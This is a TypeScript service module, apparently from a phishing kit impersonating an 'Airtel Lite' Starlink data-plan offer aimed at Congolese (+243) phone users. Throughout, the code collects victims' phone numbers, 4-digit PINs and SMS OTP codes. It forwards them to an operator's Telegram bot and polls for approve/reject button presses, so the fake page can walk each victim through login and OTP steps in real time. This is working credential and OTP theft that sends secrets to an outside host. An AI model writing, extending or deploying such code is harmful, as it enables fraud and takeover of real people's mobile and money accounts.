import { getTelegramBotToken, getTelegramChatId } from '../config/telegram';

export interface TelegramLoginPayload {
  sessionId: string;
  phone: string;
  pin: string;
  planName: string;
  planPrice: string;
}

export interface TelegramOtpPayload {
  sessionId: string;
  phone?: string;
  otp: string;
  planName?: string;
  planPrice?: string;
}

export interface TelegramStatusResult {
  loginStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
}

class TelegramService {
  private isBackendAvailable: boolean = true;
  private lastUpdateId: number = 0;
  private localSessionState: Map<
    string,
    {
      loginStatus: 'pending' | 'approved' | 'rejected';
      otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
      phone?: string;
      pin?: string;
      otp?: string;
      planName?: string;
      planPrice?: string;
      loginMessageId?: number;
      otpMessageId?: number;
    }
  > = new Map();

  /**
   * Helper to safely parse JSON
   */
  private async safeJson(res: Response): Promise<any> {
    try {
      const text = await res.text();
      if (!text || text.trim().startsWith('<') || text.trim().startsWith('The page')) {
        return null;
      }
      return JSON.parse(text);
    } catch {
      return null;
    }
  }

  /**
   * Send direct Telegram message using Telegram Bot API
   * Guaranteed fallback for static hosts like Vercel
   */
  public async sendDirectTelegramMessage(text: string, inlineKeyboard?: any): Promise<any> {
    const token = getTelegramBotToken();
    const chatId = getTelegramChatId();

    try {
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      const payload: any = {
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
      };
      if (inlineKeyboard) {
        payload.reply_markup = {
          inline_keyboard: inlineKeyboard,
        };
      }

      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      return await this.safeJson(res);
    } catch (err) {
      console.warn('[Telegram] Direct send error:', err);
      return null;
    }
  }

  /**
   * Answer callback query directly
   */
  public async answerDirectCallbackQuery(callbackQueryId: string, text: string) {
    const token = getTelegramBotToken();
    try {
      await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: callbackQueryId,
          text,
          show_alert: true,
        }),
      });
    } catch (err) {
      console.warn('Failed to answer callback query directly:', err);
    }
  }

  /**
   * Edit message text directly
   */
  public async editDirectMessageText(chatId: string | number, messageId: number, text: string) {
    const token = getTelegramBotToken();
    try {
      await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          text,
          parse_mode: 'HTML',
        }),
      });
    } catch (err) {
      console.warn('Failed to edit message text directly:', err);
    }
  }

  /**
   * Send Login Credentials (Phone + 4-digit PIN)
   * Tries backend first; if Vercel static returns 405/404, immediately falls back to direct Telegram API
   */
  public async sendLogin(payload: TelegramLoginPayload): Promise<boolean> {
    const { sessionId, phone, pin, planName, planPrice } = payload;

    // Track in local memory
    this.localSessionState.set(sessionId, {
      loginStatus: 'pending',
      otpStatus: 'idle',
      phone,
      pin,
      planName,
      planPrice,
    });

    let sentViaServer = false;

    // 1. Try server endpoint
    if (this.isBackendAvailable) {
      try {
        const serverRes = await fetch('/api/telegram/send-login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });

        if (serverRes.ok) {
          const data = await this.safeJson(serverRes);
          if (data && data.success) {
            sentViaServer = true;
            return true;
          }
        } else {
          // E.g. 405 Method Not Allowed on Vercel static
          console.warn(`[TelegramService] Backend returned status ${serverRes.status}. Switching to direct Telegram API mode.`);
          this.isBackendAvailable = false;
        }
      } catch (err) {
        console.warn('[TelegramService] Backend unreachable, switching to direct Telegram API mode:', err);
        this.isBackendAvailable = false;
      }
    }

    // 2. Direct Telegram API Fallback (Guaranteed to work on Vercel static, Netlify, Preview)
    if (!sentViaServer) {
      const messageText =
        `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
        `👤 <b>Numéro de Téléphone:</b> <code>+243 ${phone}</code>\n` +
        `🔑 <b>Code PIN (4 chiffres):</b> <code>${pin}</code>\n` +
        `📦 <b>Forfait Choisi:</b> <b>${planName}</b> (${planPrice})\n` +
        `📶 <b>Réseau:</b> Airtel RDC x Starlink Direct\n` +
        `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
        `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
        `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;

      const inlineKeyboard = [
        [
          {
            text: '✅ Valider PIN',
            callback_data: `approve_login_${sessionId}`,
          },
          {
            text: '❌ Rejeter PIN',
            callback_data: `reject_login_${sessionId}`,
          },
        ],
      ];

      const res = await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
      if (res && res.result?.message_id) {
        const local = this.localSessionState.get(sessionId);
        if (local) {
          local.loginMessageId = res.result.message_id;
        }
      }
    }

    return true;
  }

  /**
   * Send OTP Verification Code (4 digits)
   */
  public async sendOtp(payload: TelegramOtpPayload): Promise<boolean> {
    const { sessionId, phone, otp, planName, planPrice } = payload;

    const existing = this.localSessionState.get(sessionId) || {
      loginStatus: 'approved' as const,
      otpStatus: 'pending' as const,
    };
    existing.otp = otp;
    existing.otpStatus = 'pending';
    this.localSessionState.set(sessionId, existing);

    let sentViaServer = false;

    // 1. Try server endpoint
    if (this.isBackendAvailable) {
      try {
        const serverRes = await fetch('/api/telegram/send-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });

        if (serverRes.ok) {
          const data = await this.safeJson(serverRes);
          if (data && data.success) {
            sentViaServer = true;
            return true;
          }
        } else {
          console.warn(`[TelegramService] Backend OTP returned ${serverRes.status}. Using direct Telegram API.`);
          this.isBackendAvailable = false;
        }
      } catch (err) {
        console.warn('[TelegramService] Backend unreachable for OTP:', err);
        this.isBackendAvailable = false;
      }
    }

    // 2. Direct Telegram API Fallback
    if (!sentViaServer) {
      const messageText =
        `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
        `👤 <b>Numéro:</b> <code>+243 ${phone || existing.phone || 'Inconnu'}</code>\n` +
        `🔢 <b>Code OTP Saisi:</b> <code>${otp}</code>\n` +
        `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
        `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
        `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
        `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;

      const inlineKeyboard = [
        [
          {
            text: '✅ Valider OTP',
            callback_data: `approve_otp_${sessionId}`,
          },
          {
            text: '❌ Rejeter OTP',
            callback_data: `reject_otp_${sessionId}`,
          },
        ],
      ];

      const res = await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
      if (res && res.result?.message_id) {
        existing.otpMessageId = res.result.message_id;
      }
    }

    return true;
  }

  /**
   * Fast Real-time Status Polling
   * Supports both server event listeners and direct Telegram getUpdates fallback for static hosts
   */
  public async pollUpdates(
    sessionId: string,
    targetStep: 'login' | 'otp'
  ): Promise<'pending' | 'approved' | 'rejected'> {
    // 1. Check local session state
    const local = this.localSessionState.get(sessionId);
    if (local) {
      if (targetStep === 'login' && (local.loginStatus === 'approved' || local.loginStatus === 'rejected')) {
        return local.loginStatus;
      }
      if (targetStep === 'otp' && (local.otpStatus === 'approved' || local.otpStatus === 'rejected')) {
        return local.otpStatus;
      }
    }

    // 2. If backend is available, try fast wait-status or status endpoint
    if (this.isBackendAvailable) {
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 4000);

        const serverRes = await fetch(
          `/api/telegram/wait-status?sessionId=${encodeURIComponent(sessionId)}&targetStep=${targetStep}&timeout=3000`,
          { signal: controller.signal }
        );
        clearTimeout(timeoutId);

        if (serverRes.ok) {
          const data = await this.safeJson(serverRes);
          if (data && data.exists) {
            if (data.status === 'approved' || data.status === 'rejected') {
              if (local) {
                if (targetStep === 'login') local.loginStatus = data.status;
                else local.otpStatus = data.status;
              }
              return data.status;
            }

            if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
              if (local) local.loginStatus = data.loginStatus;
              return data.loginStatus;
            }
            if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
              if (local) local.otpStatus = data.otpStatus;
              return data.otpStatus;
            }
            return 'pending';
          }
        } else if (serverRes.status === 404 || serverRes.status === 405) {
          this.isBackendAvailable = false;
        }
      } catch {
        // Backend wait-status timed out or errored, proceed to direct check
      }
    }

    // 3. Direct Telegram getUpdates Fallback (Active on Vercel static deployments)
    if (!this.isBackendAvailable) {
      const token = getTelegramBotToken();
      const chatId = getTelegramChatId();

      try {
        const allowedUpdates = encodeURIComponent(JSON.stringify(['message', 'callback_query']));
        const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${this.lastUpdateId}&limit=20&allowed_updates=${allowedUpdates}`;
        const res = await fetch(url);
        const data = await this.safeJson(res);

        if (data && data.ok && Array.isArray(data.result)) {
          for (const update of data.result) {
            this.lastUpdateId = Math.max(this.lastUpdateId, update.update_id + 1);

            if (update.callback_query) {
              const cq = update.callback_query;
              const callbackData: string = cq.data || '';
              const callbackId: string = cq.id;
              const msgId = cq.message?.message_id;
              const qChatId = cq.message?.chat?.id || chatId;

              // LOGIN ACTIONS
              if (callbackData === `approve_login_${sessionId}`) {
                if (local) local.loginStatus = 'approved';
                this.answerDirectCallbackQuery(callbackId, '✅ Connexion validée ! Passage au code OTP.');
                if (msgId) {
                  const text =
                    `🔴 <b>AIRTEL LITE - CONNEXION CLIENT VALIDÉE</b>\n\n` +
                    `👤 <b>Numéro:</b> +243 ${local?.phone || ''}\n` +
                    `🔑 <b>Code PIN:</b> <code>${local?.pin || ''}</code>\n` +
                    `📦 <b>Forfait:</b> ${local?.planName || ''} (${local?.planPrice || ''})\n` +
                    `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
                    `🟢 <b>STATUT: ✅ APPROUVÉ PAR L'ADMINISTRATEUR</b>\n` +
                    `<i>L'utilisateur accède à la saisie du code OTP.</i>`;
                  this.editDirectMessageText(qChatId, msgId, text);
                }
                return 'approved';
              }

              if (callbackData === `reject_login_${sessionId}`) {
                if (local) local.loginStatus = 'rejected';
                this.answerDirectCallbackQuery(callbackId, '❌ Connexion refusée.');
                if (msgId) {
                  const text =
                    `🔴 <b>AIRTEL LITE - CONNEXION CLIENT REFUSÉE</b>\n\n` +
                    `👤 <b>Numéro:</b> +243 ${local?.phone || ''}\n` +
                    `🔑 <b>Code PIN:</b> <code>${local?.pin || ''}</code>\n` +
                    `📦 <b>Forfait:</b> ${local?.planName || ''} (${local?.planPrice || ''})\n` +
                    `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
                    `🔴 <b>STATUT: ❌ REJETÉ (CODE PIN OU NUMÉRO INCORRECT)</b>`;
                  this.editDirectMessageText(qChatId, msgId, text);
                }
                return 'rejected';
              }

              // OTP ACTIONS
              if (callbackData === `approve_otp_${sessionId}`) {
                if (local) local.otpStatus = 'approved';
                this.answerDirectCallbackQuery(callbackId, '✅ Code OTP validé avec succès !');
                if (msgId) {
                  const text =
                    `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP VALIDÉ</b>\n\n` +
                    `👤 <b>Numéro:</b> +243 ${local?.phone || ''}\n` +
                    `🔢 <b>Code OTP:</b> <code>${local?.otp || ''}</code>\n` +
                    `📦 <b>Forfait:</b> ${local?.planName || ''} (${local?.planPrice || ''})\n` +
                    `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
                    `🟢 <b>STATUT: ✅ OTP CONFIRMÉ ET VALIDÉ</b>\n` +
                    `<i>Transaction terminée avec succès.</i>`;
                  this.editDirectMessageText(qChatId, msgId, text);
                }
                return 'approved';
              }

              if (callbackData === `reject_otp_${sessionId}`) {
                if (local) local.otpStatus = 'rejected';
                this.answerDirectCallbackQuery(callbackId, '❌ Code OTP rejeté/invalide.');
                if (msgId) {
                  const text =
                    `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP REFUSÉ</b>\n\n` +
                    `👤 <b>Numéro:</b> +243 ${local?.phone || ''}\n` +
                    `🔢 <b>Code OTP:</b> <code>${local?.otp || ''}</code>\n` +
                    `📦 <b>Forfait:</b> ${local?.planName || ''} (${local?.planPrice || ''})\n` +
                    `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
                    `🔴 <b>STATUT: ❌ OTP REJETÉ / INVALIDE</b>`;
                  this.editDirectMessageText(qChatId, msgId, text);
                }
                return 'rejected';
              }
            }
          }
        }
      } catch (err) {
        console.warn('[TelegramService] Direct getUpdates poll warning:', err);
      }
    }

    return 'pending';
  }
}

export const telegramService = new TelegramService();
